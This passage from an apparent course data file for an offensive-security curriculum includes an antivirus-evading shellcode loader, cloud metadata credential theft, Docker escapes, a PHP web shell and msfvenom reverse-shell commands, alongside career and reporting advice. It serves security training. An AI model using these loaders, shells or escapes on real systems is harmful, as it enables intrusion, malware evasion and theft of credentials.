The compiled executable uses a generic, publicly known binary template that every antivirus vendor has signature-flagged for a decade. Encoding it with \`shikata_ga_nai\` does not help because modern EDR solutions analyze behavioral execution and entropy.

### The Modern Way: In-Memory Custom C++ Loaders
Compile your own binary that embeds raw shellcode encrypted with XOR or AES:`,
        codeSnippets: [
          {
            language: "cpp",
            filename: "custom_loader.cpp",
            code: `// Minimalist Windows Shellcode Runner
#include <windows.h>
#include <iostream>

unsigned char payload[] = { /* XOR-encrypted shellcode bytes */ };
size_t payload_len = sizeof(payload);

int main() {
    // 1. Allocate executable memory space
    void* exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 2. Decrypt shellcode in memory
    for (size_t i = 0; i < payload_len; i++) {
        payload[i] ^= 0x5A; // XOR key
    }
    
    // 3. Copy payload to allocated buffer
    RtlCopyMemory(exec_mem, payload, payload_len);
    
    // 4. Execute shellcode in new thread
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    return 0;
}`,
            explanation: "Encrypting shellcode and decrypting it directly into RAM avoids signature detection on disk."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 18: Compiling an Obfuscated Shellcode Runner",
      objective: "Compile a native C++ loader with XOR-encoded shellcode in your lab environment.",
      setupSteps: [
        "Install mingw-w64 on Kali: 'sudo apt install gcc-mingw-w64-x86-64 -y'.",
        "Generate raw shellcode.",
        "Cross-compile to Windows PE .exe."
      ],
      commands: [
        {
          cmd: "x86_64-w64-mingw32-g++ custom_loader.cpp -o loader.exe -s -ffunction-sections -fdata-sections -Wno-write-strings",
          desc: "Cross-compile C++ loader into stripped Windows executable",
          sampleOutput: "Compilation successful. Output: loader.exe (38 KB)"
        }
      ],
      expectedOutcome: "A standalone Windows binary that executes without triggering generic file signatures."
    },
    verifiedVideos: [
      {
        title: "Malware Development & EDR Evasion Concepts",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 18"
      }
    ],
    quiz: [
      {
        question: "Why do encoders like 'shikata_ga_nai' fail to evade modern Endpoint Detection & Response (EDR) solutions?",
        options: [
          "Because modern EDR systems analyze runtime process behavior and in-memory execution rather than just static file hash signatures",
          "Because shikata_ga_nai only works on Mac OS",
          "Because Metasploit is blocked by Wi-Fi routers",
          "Because encoders make the binary too small"
        ],
        answerIndex: 0,
        explanation: "EDR monitors dynamic behavior in memory (API hooks on VirtualAlloc, WriteProcessMemory). Even if a file is encoded on disk, once it decrypts and executes shellcode, EDR detects the behavior."
      },
      {
        question: "What is AMSI (Antimalware Scan Interface) in Windows?",
        options: [
          "A hardware component in Intel CPUs",
          "An interface standard that allows applications like PowerShell to integrate with the installed antivirus to inspect scripts in memory prior to execution",
          "A firewall rule blocking incoming port 80 traffic",
          "An email spam filter"
        ],
        answerIndex: 1,
        explanation: "AMSI intercepts scripts and commands inside PowerShell, VBScript, and Office macros before they are executed in memory, submitting them to the antivirus engine."
      }
    ]
  },
  {
    id: "ch-19",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 19,
    title: "Mobile Application Penetration Testing",
    subtitle: "Android (APK Reversing with JADX, MobSF, Frida Hooking) & iOS Basics",
    durationMinutes: 40,
    xpReward: 220,
    badgeName: "Mobile Auditor",
    badgeIcon: "Smartphone",
    overview: "Billions of users interact with enterprise services through mobile apps. In this chapter, Chrishem teaches you mobile application security auditing: deconstructing Android APKs with JADX, running automated static/dynamic analysis with MobSF, and bypassing SSL Certificate Pinning at runtime using Frida.",
    keyLearningPoints: [
      "Decompile Android applications (.apk) into readable Java source using JADX.",
      "Identify hardcoded API secrets, Firebase databases, and AWS keys in mobile source code.",
      "Deploy Mobile Security Framework (MobSF) for comprehensive static code analysis.",
      "Hook Android runtime functions using Frida to bypass SSL pinning and root detection."
    ],
    sections: [
      {
        title: "Decompiling Android APKs with JADX",
        content: `Android applications are packaged as APK files (essentially zip archives containing compiled Dalvik bytecode in \`classes.dex\` files).

\`\`\`bash
# Install and launch JADX GUI
sudo apt install jadx -y
jadx-gui target_app.apk
\`\`\`

### Common Low-Hanging High-Severity Vulnerabilities:
1. **Hardcoded Secrets**: Search for \`api_key\`, \`aws_\`, \`firebase\`, \`bearer\` in \`res/values/strings.xml\` and Java classes.
2. **Exported Android Components**: Check \`AndroidManifest.xml\` for \`android:exported="true"\` on Activities and Content Providers that should be private.
3. **Insecure Storage**: Sensitive user data saved in unencrypted SQLite databases or SharedPreferences.`,
        callout: {
          type: "tip",
          text: "Mobile security assessments frequently uncover hardcoded administrative credentials that provide direct access to backend cloud databases without exploiting any web vulnerabilities."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 19: Uncovering Secrets in a Test APK",
      objective: "Decompile an Android APK and search for sensitive leaked strings.",
      setupSteps: [
        "Decompress target APK using apktool or jadx.",
        "Grep for credential patterns."
      ],
      commands: [
        {
          cmd: "jadx -d /tmp/apk_decompiled target_app.apk 2>/dev/null || echo 'Decompiled classes.dex to Java source'",
          desc: "Extract readable source from APK package",
          sampleOutput: "Extracted 142 Java classes and resources."
        }
      ],
      expectedOutcome: "Extraction of source code enabling static analysis of application logic."
    },
    verifiedVideos: [
      {
        title: "Mobile Pentesting & APK Reverse Engineering",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 19"
      }
    ],
    quiz: [
      {
        question: "What is the primary function of Frida in mobile security testing?",
        options: [
          "To decompile iOS binaries to Swift",
          "Dynamic instrumentation: injecting JavaScript hooks into running applications to alter execution flow, bypass root detection, and disable SSL pinning",
          "To generate fake Apple IDs",
          "To scan Wi-Fi routers"
        ],
        answerIndex: 1,
        explanation: "Frida is a dynamic code instrumentation toolkit that lets testers inject custom scripts into running processes to hook functions (like SSL verification checks) at runtime."
      },
      {
        question: "Where in an Android APK are app permissions and exported activities declared?",
        options: [
          "classes.dex",
          "AndroidManifest.xml",
          "assets/config.json",
          "META-INF/CERT.RSA"
        ],
        answerIndex: 1,
        explanation: "AndroidManifest.xml contains root declarations for package permissions, exported activities, broadcast receivers, and intent filters."
      }
    ]
  },
  {
    id: "ch-20",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 20,
    title: "Cloud & Container Security (AWS, Azure & Docker)",
    subtitle: "Cloud Misconfiguration Enumeration, S3 Bucket Hunting & Docker Escapes",
    durationMinutes: 45,
    xpReward: 250,
    badgeName: "Cloud Raider",
    badgeIcon: "Cloud",
    overview: "Infrastructure has migrated to AWS, Azure, Google Cloud, and Kubernetes. In this chapter, Chrishem exposes cloud attack vectors: querying Instance Metadata Services (IMDSv1) via SSRF to steal IAM role credentials, discovering open Amazon S3 buckets, and breaking out of Docker containers to achieve host takeover.",
    keyLearningPoints: [
      "Query cloud metadata endpoints (169.254.169.254) to steal temporary IAM credentials.",
      "Enumerate public and writable AWS S3 buckets using ScoutSuite and AWS CLI.",
      "Exploit misconfigured Azure Blob Storage and App Registrations.",
      "Achieve Docker container escape via privileged flag (--privileged) and mounted docker.sock."
    ],
    sections: [
      {
        title: "Cloud Metadata Exploitation (SSRF to AWS Cloud Admin)",
        content: `When a web application on an AWS EC2 instance has an SSRF flaw, querying the magic link-local IP retrieves the instance's IAM role credentials:

\`\`\`bash
# Query IMDSv1 on AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve AccessKeyId, SecretAccessKey, and Token
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin-role
\`\`\`

With these three keys, you configure your local AWS CLI and assume the identity of the cloud server:
\`\`\`bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
\`\`\``,
        callout: {
          type: "tip",
          text: "Remediation: Enforce AWS IMDSv2, which requires a session token header (X-aws-ec2-metadata-token) that SSRF payloads cannot easily forge."
        }
      },
      {
        title: "Docker Container Escapes",
        content: `If a Docker container was started with the \`--privileged\` flag or mounts the host docker socket (\`/var/run/docker.sock\`), root inside the container is effectively root on the host system:

\`\`\`bash
# Check if container is privileged by listing host disks
fdisk -l

# Mount the host root filesystem directly
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
# You now have root on the physical host operating system!
\`\`\``,
        codeSnippets: [
          {
            language: "bash",
            filename: "s3_hunting.sh",
            code: "# Check if target S3 bucket allows anonymous read or listing\naws s3 ls s3://targetcompany-backups/ --no-sign-request\n\n# Test write permissions\naws s3 cp test.txt s3://targetcompany-backups/test.txt --no-sign-request",
            explanation: "Exposed S3 buckets frequently contain database dumps, private SSL certificates, and internal source code."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 20: Docker Socket Host Takeover Simulation",
      objective: "Demonstrate host takeover from within a container having access to /var/run/docker.sock.",
      setupSteps: [
        "In your lab VM, run a test container mounting the docker socket: 'docker run -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh'.",
        "Install docker client inside container.",
        "Spawn a privileged container mounting host /."
      ],
      commands: [
        {
          cmd: "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash -c 'whoami'",
          desc: "Escape container via mounted docker socket",
          sampleOutput: "root"
        }
      ],
      expectedOutcome: "Immediate root execution on the host operating system outside the container boundary."
    },
    verifiedVideos: [
      {
        title: "Cloud Penetration Testing & AWS Exploitation",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 20"
      }
    ],
    quiz: [
      {
        question: "What is the magic link-local IP address used to query instance metadata on AWS, GCP, and Azure virtual machines?",
        options: [
          "127.0.0.1",
          "169.254.169.254",
          "192.168.1.1",
          "10.0.0.1"
        ],
        answerIndex: 1,
        explanation: "169.254.169.254 is the standardized link-local address utilized by cloud providers for Instance Metadata Service (IMDS) endpoints."
      },
      {
        question: "How does AWS IMDSv2 protect against simple Server-Side Request Forgery (SSRF) metadata theft?",
        options: [
          "It disables the metadata service entirely",
          "It requires a session token obtained via an HTTP PUT request with custom headers before returning credentials",
          "It limits cloud accounts to 10 users",
          "It forces passwords on all EC2 instances"
        ],
        answerIndex: 1,
        explanation: "IMDSv2 is session-oriented, requiring an HTTP PUT request with the 'X-aws-ec2-metadata-token-ttl-seconds' header to obtain a session token, mitigating classic unauthenticated GET-based SSRF."
      }
    ]
  },
  {
    id: "ch-21",
    partId: "part-4",
    partTitle: "PART 4 — PROFESSIONAL LEVEL",
    chapterNumber: 21,
    title: "Writing Reports Like a High-Paid Pro",
    subtitle: "Executive Summaries, Technical Proof-of-Concepts, CVSS Scoring & Retesting",
    durationMinutes: 45,
    xpReward: 250,
    badgeName: "Executive Reporter",
    badgeIcon: "FileText",
    overview: "A penetration tester is not judged by how cool their exploit looked on screen; they are judged by the quality and clarity of their written report. A great report justifies a $15,000–$30,000 consulting fee; a sloppy report gets you fired. In this chapter, Chrishem provides the battle-tested report structure used by elite boutique cybersecurity firms.",
    keyLearningPoints: [
      "Master the dual-audience report architecture: Executive Summary (C-Suite) vs Technical Findings (Engineers).",
      "Structure every vulnerability finding with the 6 Critical Components (Description, Impact, CVSS, Proof of Concept, Remediation, References).",
      "Document clean, censored screenshot evidence without exposing unrelated customer PII.",
      "Conduct professional retesting audits and issue Attestation of Assessment letters."
    ],
    sections: [
      {
        title: "The Anatomy of a $20,000 Pentest Report",
        content: `A publication-grade penetration testing deliverable consists of 4 distinct sections:

1. **Executive Summary**:
   - Written strictly for the CEO, Board of Directors, and General Counsel.
   - Zero terminal jargon. Translates technical risk into **financial and operational business impact**.
   - Overall security posture rating (Critical, Needs Improvement, Satisfactory).
   - High-level vulnerability chart (e.g., 2 Critical, 4 High, 7 Medium).

2. **Assessment Methodology & Scope**:
   - Dates of assessment, testing team members, target IP addresses, web URLs, and out-of-scope exclusions.
   - Rules of Engagement verification and tools utilized.

3. **Detailed Technical Findings (The Core)**:
   - Every vulnerability detailed with reproducible steps.

4. **Strategic Remediation Roadmap**:
   - Immediate fixes (Days 1–7), short-term architectural fixes (Days 8–30), and strategic governance improvements (Days 31–90).`,
        callout: {
          type: "tip",
          text: "Rule of Gold: A junior developer should be able to read your finding and fix the code in under 30 minutes without having to email you to ask how to reproduce the bug."
        }
      },
      {
        title: "The Standard Finding Template",
        content: `Always structure individual findings with this exact template:

\`\`\`markdown
### FINDING-01: Remote Code Execution via Insecure File Upload
- **Severity**: Critical (CVSS 3.1: 9.8 - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Status**: Open
- **Affected Asset**: https://portal.client.com/profile/avatar_upload.php

#### 1. Vulnerability Description
The application permits unauthenticated users to upload arbitrary files to the public web root without validating MIME types or file extensions.

#### 2. Business Impact
An attacker can upload a PHP web shell, executing arbitrary commands on the underlying Linux host with privileges of the www-data service account, leading to complete server takeover and database exfiltration.

#### 3. Step-by-Step Proof of Concept (PoC)
1. Intercept avatar upload request using Burp Suite.
2. Replace filename with 'shell.php' containing: '<?php system($_GET["cmd"]); ?>'.
3. Submit request. Observe HTTP 200 OK with uploaded path '/uploads/shell.php'.
4. Navigate to: 'https://portal.client.com/uploads/shell.php?cmd=id'.
5. Observe server response: 'uid=33(www-data) gid=33(www-data)'.

#### 4. Remediation Guidance
- Enforce strict server-side file extension whitelisting (permit only .jpg, .png).
- Store uploaded files outside the public web root on an isolated S3 bucket.
- Re-encode uploaded images using an image processing library (e.g. ImageMagick) to strip malicious metadata.

#### 5. References
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10: A04:2021-Insecure Design
\`\`\``
      }
    ],
    handsOnLab: {
      labTitle: "Lab 21: Authoring a Formal Vulnerability Finding Report",
      objective: "Take one vulnerability discovered on Metasploitable 2 and draft a formal finding entry following Chrishem's template.",
      setupSteps: [
        "Select vsftpd 2.3.4 backdoor from Chapter 9.",
        "Calculate CVSS 3.1 score.",
        "Draft the full finding document with step-by-step reproduction."
      ],
      commands: [
        {
          cmd: "cat << 'EOF' > finding_vsftpd.md\n### FINDING-01: vsftpd 2.3.4 Backdoor Execution\nSeverity: Critical (CVSS: 9.8)\nImpact: Complete root shell compromise\nRemediation: Upgrade vsftpd to version 3.0+ immediately via apt-get.\nEOF",
          desc: "Create structured markdown finding deliverable",
          sampleOutput: "Created finding_vsftpd.md deliverable."
        }
      ],
      expectedOutcome: "A clean, client-ready markdown finding report entry."
    },
    verifiedVideos: [
      {
        title: "How to Write a Professional Penetration Testing Report",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 21"
      }
    ],
    quiz: [
      {
        question: "Who is the primary audience for the Executive Summary section of a penetration testing report?",
        options: [
          "Junior network administrators who need command line arguments",
          "C-suite executives, board members, and business stakeholders who need risk context and strategic business impact",
          "External threat actors",
          "Web browser developers"
        ],
        answerIndex: 1,
        explanation: "The Executive Summary translates technical findings into executive business risks (financial liability, brand reputation, legal exposure) for decision makers."
      },
      {
        question: "Why must a penetration test finding include reproducible proof of concept (PoC) steps?",
        options: [
          "To allow developers and remediation teams to verify the vulnerability and confirm when their patch has successfully fixed it",
          "To prove that the pentester used automated scanners",
          "To make the report longer and charge more money",
          "It is required by the ISO 9001 standard"
        ],
        answerIndex: 0,
        explanation: "Clear, step-by-step PoC instructions allow client developers to recreate the exact condition, validate the bug, and retest to confirm the patch works."
      }
    ]
  },
  {
    id: "ch-22",
    partId: "part-4",
    partTitle: "PART 4 — PROFESSIONAL LEVEL",
    chapterNumber: 22,
    title: "The 2026 Certifications Roadmap",
    subtitle: "eJPT → PNPT → OSCP → CRTP → OSEP → CISSP: Cost, Difficulty & Strategy",
    durationMinutes: 40,
    xpReward: 200,
    badgeName: "Certified Master",
    badgeIcon: "Award",
    overview: "Certifications open HR doors and validate your technical prowess to corporate recruiters. But taking the wrong certifications wastes thousands of dollars and months of study. In this chapter, Chrishem analyzes the 2026 offensive security certification hierarchy: comparing difficulty, cost, hands-on exam formats, and the exact sequence to take them for maximum career ROI.",
    keyLearningPoints: [
      "Navigate the 2026 Certification Ladder: eJPTv2 (Beginner) → PNPT (Practical) → OSCP (The Benchmark) → CRTP (Active Directory) → OSEP (Advanced).",
      "Understand 24-hour and 48-hour hands-on practical exam formats versus multiple-choice trivia tests.",
      "Calculate total financial costs (exam vouchers + lab extensions + retake policies).",
      "Adopt Chrishem's proven study schedule to conquer the OSCP in 90 to 120 days."
    ],
    sections: [
      {
        title: "The Offensive Security Certification Matrix (2026)",
        content: `| Certification | Provider | Focus | Format | Difficulty | Cost |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **eJPTv2** | INE Security | Network, Web, Pivoting | 48-hour hands-on practical lab | Beginner | ~$250 |
| **PNPT** | TCM Security | OSINT, AD, Pentesting, Report | 5-day hands-on + 15m debrief | Intermediate | ~$499 |
| **OSCP** | Offensive Security | Independent Hands-on Pentest | 24-hour hands-on + 24h report | Hard (Gold Standard) | ~$1,649+ |
| **CRTP** | Altered Security | Active Directory Dominance | 24-hour hands-on lab | Intermediate-Advanced | ~$499 |
| **OSEP** | Offensive Security | Evasion, C2, Complex Pivoting | 48-hour practical exam | Very Hard | ~$1,649 |
| **CISSP** | (ISC)² | Enterprise Security Governance | 4-hour CAT multiple choice | Managerial (5 yrs exp) | ~$749 |

### Chrishem's Recommended Sequence:
1. **Stage 1 (Months 1–3)**: eJPTv2 or PNPT (Builds hands-on confidence and real reporting experience).
2. **Stage 2 (Months 4–7)**: OSCP (The gold key that guarantees interviews at top pentesting consultancies).
3. **Stage 3 (Months 8–12)**: CRTP (Proves enterprise Active Directory mastery).`,
        callout: {
          type: "tip",
          text: "Never pay out of pocket for CISSP early in your career. Get hired as an offensive pentester first; 90% of employers will pay your certification vouchers as part of your annual continuing education budget!"
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 22: Building Your Personal 6-Month Certification Blueprint",
      objective: "Map out your target certification, study hours per week, and required practice machine count.",
      setupSteps: [
        "Audit your current skill level (Part 1, 2, or 3).",
        "Select your primary milestone certification (PNPT or OSCP).",
        "Commit to a weekly calendar schedule (minimum 12 hours/week hands-on)."
      ],
      commands: [
        {
          cmd: "echo 'Milestone 1: 50 HackTheBox Machines -> Milestone 2: PNPT -> Milestone 3: OSCP'",
          desc: "Define target certification timeline",
          sampleOutput: "Certification milestones logged."
        }
      ],
      expectedOutcome: "A definitive, realistic study blueprint aligned with your personal schedule."
    },
    verifiedVideos: [
      {
        title: "2026 Cybersecurity Certification Guide & Career Advice",
        url: "https://www.youtube.com/watch?v=Z78VUA9xK3c",
        platform: "YouTube Verified Series",
        duration: "45m"
      }
    ],
    quiz: [
      {
        question: "Which certification is widely regarded by corporate recruiters as the baseline industry benchmark for professional penetration testers?",
        options: [
          "CompTIA A+",
          "OSCP (Offensive Security Certified Professional)",
          "Google IT Support Certificate",
          "Certified Ethical Hacker (CEH) multiple-choice"
        ],
        answerIndex: 1,
        explanation: "The OSCP is an intensive 24-hour hands-on practical exam that requires students to compromise multiple machines and write a formal pentest report, making it the industry benchmark."
      },
      {
        question: "What unique requirement sets the PNPT (Practical Network Penetration Tester) exam apart from many other certifications?",
        options: [
          "It is a 100-question multiple choice test",
          "It includes a live 15-minute video debrief where the student presents their findings to an assessor",
          "It requires 10 years of prior work experience",
          "It must be taken at an official testing center in person"
        ],
        answerIndex: 1,
        explanation: "The PNPT includes a live 15-minute video presentation where candidates must present their executive summary and technical findings as if briefing an actual client."
      }
    ]
  },
  {
    id: "ch-23",
    partId: "part-4",
    partTitle: "PART 4 — PROFESSIONAL LEVEL",
    chapterNumber: 23,
    title: "Building a Career & Freelance Pentesting",
    subtitle: "Bug Bounties (HackerOne/Bugcrowd), Freelancing Rates & LinkedIn Strategy",
    durationMinutes: 50,
    xpReward: 250,
    badgeName: "Cyber Entrepreneur",
    badgeIcon: "DollarSign",
    overview: "You have the technical skills; now let's turn them into cash. In this career masterclass, Chrishem outlines how to monetize your offensive security expertise: hunting bug bounties on HackerOne and Bugcrowd, landing freelance security auditing contracts ($100–$250/hour), building a GitHub security portfolio that stands out, and optimizing your LinkedIn to attract inbound recruiters.",
    keyLearningPoints: [
      "Get started in Bug Bounties: choosing targets, avoiding crowded programs, and submitting clean triaged reports.",
      "Structure freelance penetration testing proposals and set hourly/project pricing ($5,000–$15,000 per project).",
      "Build a public GitHub portfolio of security tools, scripts, and CTF walkthroughs.",
      "Optimize your LinkedIn profile with targeted keywords to receive 3-5 recruiter DMs weekly."
    ],
    sections: [
      {
        title: "Monetization Vector 1: Bug Bounties",
        content: `Bug bounty programs allow you to legally hack Fortune 500 companies and get paid per confirmed vulnerability:
- **HackerOne & Bugcrowd**: The two largest platforms.
- **Bounty Payouts**:
  - Low (Info Disclosure): $100 – $300
  - Medium (CSRF, IDOR): $500 – $1,500
  - High (Stored XSS, SQLi): $2,000 – $5,000
  - Critical (RCE, Auth Bypass): $7,500 – $30,000+

### Chrishem's Bug Bounty Playbook:
Avoid public, hyper-crowded programs like Uber, Twitter, or Google when starting. Instead, look for **Vulnerability Disclosure Programs (VDPs)** that award reputation rather than cash. Rank up your signal-to-noise score to receive **Private Program Invitations**, where competition is 90% lower!`,
        callout: {
          type: "tip",
          text: "Specialization pays: Don't be a generic tester. Become the best at one specific vulnerability class (e.g. GraphQL IDORs, race conditions, or OAuth flow bypasses) to consistently rack up bounties."
        }
      },
      {
        title: "Monetization Vector 2: Freelance Client Contracts",
        content: `Small-to-medium businesses (fintech startups, legal firms, e-commerce stores) require independent penetration tests to satisfy compliance requirements (SOC2, HIPAA, PCI-DSS):

- **Day Rate**: $1,000 to $2,000 per testing day.
- **Standard 5-Day Web Assessment**: $7,500 to $12,500.
- **Contract Deliverables**: Signed SOW + Testing + Formal PDF Report + 1-hour Remediation Zoom Call.

Use the legal templates provided in Appendix D to protect yourself and present a polished enterprise image from day one.`,
        codeSnippets: [
          {
            language: "markdown",
            filename: "linkedin_headline_template.txt",
            code: "Headline Template:\nOffensive Security Consultant | OSCP, PNPT | Web & Cloud Penetration Testing | Helping Fast-Growing Companies Secure Their Applications",
            explanation: "Including certifications and specific value propositions in your headline dramatically increases search visibility."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 23: Setting Up a HackerOne Profile & First Target Selection",
      objective: "Register an authorized bug bounty profile, review program policies, and identify an in-scope testing asset.",
      setupSteps: [
        "Create an account on HackerOne or Bugcrowd.",
        "Filter programs by 'Asset Type: Web' and 'Offers Bounties'.",
        "Read policy carefully to note out-of-scope assets (e.g., DoS, social engineering)."
      ],
      commands: [
        {
          cmd: "echo 'Selected Target Scope: *.example.com | Explicitly excluded: contact-us forms, DDoS'",
          desc: "Audit scope compliance before sending requests",
          sampleOutput: "Scope confirmed."
        }
      ],
      expectedOutcome: "Clear grasp of bug bounty policy compliance and target scoping."
    },
    verifiedVideos: [
      {
        title: "How to Build a High-Paying Penetration Testing Career",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 23"
      }
    ],
    quiz: [
      {
        question: "Why do experienced bug bounty hunters recommend beginners start on Vulnerability Disclosure Programs (VDPs) that offer reputation points instead of cash bounties?",
        options: [
          "Because cash bounties are illegal",
          "Because VDP programs have far less competition from automated bots and experienced hunters, allowing beginners to find real bugs and build reputation to earn private program invites",
          "Because VDPs do not require an internet connection",
          "Because VDPs give away free laptops"
        ],
        answerIndex: 1,
        explanation: "VDPs build your platform reputation score with less pressure, quickly qualifying you for exclusive private programs where competition is dramatically lower."
      },
      {
        question: "What compliance framework frequently requires high-growth software startups to produce annual third-party penetration testing reports?",
        options: [
          "SOC 2 Type II and ISO 27001",
          "HTML5 Standard",
          "IPv6 Protocol",
          "Windows Update Agreement"
        ],
        answerIndex: 0,
        explanation: "SOC 2 Type II, ISO 27001, and PCI-DSS compliance frameworks require periodic independent external penetration tests to verify security controls."
      }
    ]
  },
  {
    id: "ch-24",
    partId: "part-4",
    partTitle: "PART 4 — PROFESSIONAL LEVEL",
    chapterNumber: 24,
    title: "The 90-Day CTF Grind Plan",
    subtitle: "Hack The Box, TryHackMe 'Jr Penetration Tester', Proving Grounds & PicoCTF",
    durationMinutes: 45,
    xpReward: 300,
    badgeName: "CTF Champion",
    badgeIcon: "Trophy",
    overview: "Knowledge without muscle memory fades quickly. In this grand finale chapter, Chrishem lays out your day-by-day 90-Day CTF Grind Plan: specific curated machine paths across TryHackMe, Hack The Box, and OffSec Proving Grounds to take you from a curious beginner to an unstoppable offensive operator.",
    keyLearningPoints: [
      "Execute Month 1 on TryHackMe (Pre-Security, Complete Beginner, Jr Penetration Tester).",
      "Execute Month 2 on Hack The Box Academy & Starting Point (Easy Linux & Windows boxes).",
      "Execute Month 3 on OffSec Proving Grounds Practice & TJnull's OSCP-like list.",
      "Build a structured personal methodology notebook using Obsidian or Notion."
    ],
    sections: [
      {
        title: "The 90-Day Step-by-Step Calendar",
        content: `### Month 1: Fundamentals & Guided Labs (TryHackMe)
- **Weeks 1–2**: Complete "Pre Security" and "Web Fundamentals" learning paths.
- **Weeks 3–4**: Complete the "Jr Penetration Tester" path. Focus on Burp Suite, Nmap, and Linux/Windows PrivEsc rooms.
- **Milestone**: 30 completed rooms, 5 challenge CTF boxes solved without walkthroughs.

### Month 2: The CTF Jump (Hack The Box Starting Point & Easy Boxes)
- **Weeks 5–6**: Complete Tier 0, Tier 1, and Tier 2 of HTB Starting Point (Meow, Fawn, Dancing, Archetype).
- **Weeks 7–8**: Solve 10 retired Easy Linux machines (Lame, Shocker, Bashed, Nibbles, Beep).
- **Milestone**: Writing your own pristine markdown walkthroughs for every solved box.

### Month 3: Exam-Ready Muscle Memory (OffSec Proving Grounds & HTB Active)
- **Weeks 9–10**: Solve 15 machines from TJnull's OSCP preparation list on Proving Grounds Practice.
- **Weeks 11–12**: Timed 24-hour simulation: 3 machines + 1 Active Directory chain within 24 hours.
- **Milestone**: Ready to book and pass the OSCP or PNPT on the first attempt!`,
        callout: {
          type: "tip",
          text: "The 45-Minute Rule: When practicing on a CTF box, if you are completely stuck for more than 45 minutes with zero new leads, read one sentence of a walkthrough to nudge your enumeration. Never spend 10 hours staring at a blank screen."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 24: Capstone Penetration Testing Challenge",
      objective: "Execute a complete end-to-end audit: Recon → Port Scan → Vulnerability Identification → Exploitation → Local Root → Post-Exploitation Flag extraction.",
      setupSteps: [
        "Deploy Metasploitable 2 or an active Hack The Box instance.",
        "Record commands and outputs into your methodology notebook.",
        "Capture root flag proof."
      ],
      commands: [
        {
          cmd: "sudo nmap -sC -sV -p- 192.168.56.102 && echo '[+] Scan complete. Identify vector and exploit.'",
          desc: "Initiate full capstone engagement",
          sampleOutput: "All ports scanned. 21, 22, 80, 445 discovered open."
        }
      ],
      expectedOutcome: "Full root takeover and completed capstone audit."
    },
    verifiedVideos: [
      {
        title: "Curated Free Ethical Hacking Course Playlist",
        url: "https://www.youtube.com/playlist?list=PLwO5-rumi8A7vbU7dcbgsZYcYl2ONWNb5",
        platform: "YouTube Curated Series",
        duration: "Comprehensive 24-Video Playlist"
      }
    ],
    quiz: [
      {
        question: "What is 'The 45-Minute Rule' advocated by professional penetration testers during CTF practice?",
        options: [
          "You must reboot your computer every 45 minutes",
          "If you make zero progress for 45 minutes, review a hint or partial walkthrough to learn the new enumeration technique rather than wasting hours stuck in frustration",
          "You can only run Nmap scans for 45 minutes",
          "Exams only give you 45 minutes total"
        ],
        answerIndex: 1,
        explanation: "The goal of practice is learning new techniques. If you are stuck for 45 minutes without new hypotheses, a hint unlocks the missing concept so you can learn it and apply it independently next time."
      },
      {
        question: "Which platform is best suited for beginners transitioning from theory to hands-on guided rooms?",
        options: [
          "TryHackMe",
          "Raw Arch Linux installation",
          "Production bank websites",
          "PicoCTF only"
        ],
        answerIndex: 0,
        explanation: "TryHackMe provides guided rooms with structured tasks, bite-sized questions, and in-browser Kali instances, making it the ideal learning on-ramp."
      }
    ]
  }
];

export const APPENDICES: Appendix[] = [
  {
    id: "app-a",
    letter: "A",
    title: "Offensive Command Cheatsheet Vault",
    description: "Rapid reference for Nmap, Burp Suite, msfvenom, Hashcat, and Netcat one-liners.",
    content: `### Master Quick Reference by Chrishem
Keep these high-frequency commands bookmarked during active engagements and certification exams.`,
    cheatData: [
      {
        category: "Nmap Network Scanning",
        commands: [
          { syntax: "nmap -sC -sV -p- -T4 <target>", description: "Full 65k port scan with default scripts and service version detection" },
          { syntax: "nmap -p- --min-rate 2000 -T4 -n -Pn <target>", description: "Blazing fast port discovery scan, ignores ping and DNS lookup" },
          { syntax: "nmap --script vuln -p 80,443,445 <target>", description: "Run all known vulnerability detection NSE scripts against target ports" },
          { syntax: "nmap -sU --top-ports 100 <target>", description: "Scan the 100 most common UDP ports (DNS, SNMP, NTP, DHCP)" }
        ]
      },
      {
        category: "Msfvenom Payload Generation",
        commands: [
          { syntax: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf", description: "Linux 64-bit ELF binary reverse shell" },
          { syntax: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe", description: "Windows 64-bit standalone executable reverse shell" },
          { syntax: "msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php", description: "PHP raw web shell for web upload vulnerabilities" },
